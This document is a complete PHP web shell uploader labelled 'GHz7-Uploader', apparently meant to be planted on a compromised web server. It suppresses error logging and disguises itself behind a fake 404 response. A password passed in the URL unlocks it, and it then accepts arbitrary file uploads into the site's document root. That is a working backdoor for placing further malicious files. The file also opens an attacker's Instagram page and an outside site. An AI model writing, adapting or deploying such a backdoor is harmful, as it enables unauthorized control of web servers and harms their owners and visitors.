<?php
session_start();@error_reporting(0);@set_time_limit(0);@clearstatcache();@ini_set('error_log',NULL);@ini_set('log_errors',0);@ini_set('max_execution_time',0);@ini_set('output_buffering',0);@ini_set('display_errors',0);header('HTTP/1.1 404 Not Found');$password = "bb71befab6a07312b61713e5a18ccb2f";if($_GET['q'] == logout){unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);echo "<script>window.location='?';window.open('https://instagram.com/zxmbxe_','_blank');</script>
	";}function login(){header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found");?>
<?
exit;}if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($password) || ( isset($_GET['q']) && (md5($_GET['q']) == $password) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;else
    login();?>
<style type='text/css'>
@import url('https://fonts.googleapis.com/css?family=Aldrich');h1{margin:0 0 0 0;font-family:'Aldrich',sans-serif;animation:lamer 0.5s infinite;font-size:50px;}@keyframes lamer{10%{color:#ffffff;}20%{color:#ff0000;}30%{color:#000000;}40%{color:#ffffff;}50%{color:#ff0000;}60%{color:#000000;}70%{color:#ffffff;}80%{color:#ff0000;}90%{color:#000000;}100%{color:#ff0000;}}body{background:url('https://i.ytimg.com/vi/hsk1ndZUUes/maxresdefault.jpg')center;background-size:cover;background-repeat:no-repeat;overflow:hidden;font-family:Ubuntu;color:#000;display:flex;align-items:center;justify-content:center;}</style>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<link rel='icon' type='image/png' href='https://www.redditstatic.com/icon.png' type='image/x-icon'>
<meta name='theme-color' content=' #000000'>
<title>GHz7</title>
</head>
<body>
<center><h1>GHz7-Uploader</h1><br>
<form method='post' enctype='multipart/form-data'>
<input type='file' name='lamer_file'></input>
<input type='submit' name='ghz7' value='<xxx>'></input>
</form>
<?php
$root = $_SERVER['DOCUMENT_ROOT'];$files = $_FILES['lamer_file']['name'];$dest = $root.'/'.$files;if(isset($_POST['ghz7'])){if(is_writable($root)){if(@copy($_FILES['lamer_file']['tmp_name'],$dest)){$web = "http://".$_SERVER['HTTP_HOST']."/";echo "
			<script type='text/javascript'>
			alert('succsessful uploaded file in $web$files');window.open('$web$files','_blank');window.open('https://instagram.com/zxmbxe_','_blank');</script>
			";}else{echo "
			<script type='text/javascript'>
			alert('upload failed in document root.');</script>
			";}}else{if(@copy($_FILES['lamer_file']['tmp_name'],$files)){echo "
			<script type='text/javascript'>
			alert('succsessful uploaded $files in this folder!.');</script>
			";}else{echo "
			<script type='text/javascript'>
			alert('failed to upload file.');window.open('https://easybanget.tech','_blank');</script>
			";}};}?>
</body>
</html>
